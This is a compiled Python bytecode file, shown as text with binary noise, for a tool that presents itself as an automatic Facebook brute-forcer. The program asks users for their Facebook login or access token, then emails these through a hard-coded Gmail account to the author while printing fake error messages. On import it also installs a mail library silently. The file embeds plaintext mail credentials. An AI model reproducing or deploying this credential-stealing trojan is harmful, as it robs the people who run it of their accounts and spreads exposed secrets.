U
    �&�_;  �                   @   s�   d dl Z d dlZd dlZd dlZd dlZzd dlZW n ek
rR   e �d� Y nX dZdZ	dZ
e�ee	�ZdZdd� Ze�  dS )	�    Nz,python3 -m pip install yagmail &> /dev//nullzresultresult95@gmail.comZnmapframework8080zmringsss52@gmail.comz[SAYDOG] Python Loggerc                  C   sr  �zJt �d� td� td� td� td� td� td� td� td	� td
� td� td� td� td� td	� ttd��} | dks�| dkr�td	� ttd��}ttd��}td	� t�d� d| d | }|}t�t	t
|� td� �nP| dk�s| dk�r~td	� ttd��}|dk�rHt�d� td	� td� n4t�d� d| }|}t�t	t
|� td	� td� n�| dk�s�| dk�r$td	� ttd��}ttd��}td	� t�d� d| d | }|}t�t	t
|� d}td | � td	� ttd!��} | d"k�rt�  nt�  n&| d#k�s8| d$k�rDt�d%� nt�  W n  tk
�rl   t�d%� Y nX d S )&N�clearz[33mz
		    AMBFz[35ma�                       ||
                     ||
                     ||
               _ /\  ||  /\ _
              / X  \.--./  X \
             /_/ \/`    `\/ \_\
            /|(`-/\_/)(\_/\-`)|\
           ( |` (_(.oOOo.)_) `| )
           ` |  `//\(  )/\\`  |`
             (  // ()\/() \\  )
              ` (   \   /   ) `
                 \         /
                  `       `z [00m                  Automaticz([00m          Multi Bruteforce Facebookz#[00m              Author by saydog� zChoose you're login methodsz5[91m{[00m01[91m}[00m Login using account facebookz3[91m{[00m02[91m}[00m Login using token facebookz+[91m{[00m03[91m}[00m Get token facebookz[91m{[00m00[91m}[91m Exitz[00m[[91m~[00m] > �1Z01z[35m[~][00m Username: z[35m[~][00m Password: �   z
username: z, password: z3[91m[!] invalid username or password: login failed�2Z02z%[35m[~][00m input token here: [33mZ`CcNzFubnpXpUAg88cNz6a8ZRszT6FFp53HgzHzdtP3YBTxX54bfT7xUrpaUhmAErWEMXKqJTq37J6V2Sb8vaA5Pep4DJjp7Kz$[91m[!] account has been checkpointzfacebook token: �3Z03z[91m[+][00m token: [33mz[91m[[00m ENTER [91m] � �0Z00r   )�os�system�print�str�input�time�sleep�x�send�to�subject�main�sys�exit�KeyboardInterrupt)ZdogZusr�pwd�msgZbody�tok�token� r   �/sdcard/FB-Random-Crack.pyr      sz    









r   )r
   r   r   ZsocketZstructZyagmail�ImportErrorr   ZemailZpasswr   ZSMTPr   r   r   r   r   r   r   �<module>   s   N